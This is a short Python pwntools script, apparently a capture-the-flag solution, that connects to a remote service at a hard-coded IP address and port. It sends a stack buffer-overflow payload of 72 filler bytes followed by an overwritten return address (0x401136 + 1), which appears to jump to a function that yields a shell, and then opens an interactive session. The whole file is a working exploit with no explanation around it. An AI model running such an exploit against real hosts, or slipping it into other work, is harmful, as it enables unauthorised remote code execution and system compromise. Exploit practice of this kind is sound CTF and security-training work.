#!/bin/python
from pwn import *
exe = ELF('./patched-shell')

p = remote('34.134.173.142',5000) 
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''
#
#
#            ''')
payload = b'A'*72
payload += p64(0x0000000000401136 + 1)
p.sendline(payload)
p.interactive()
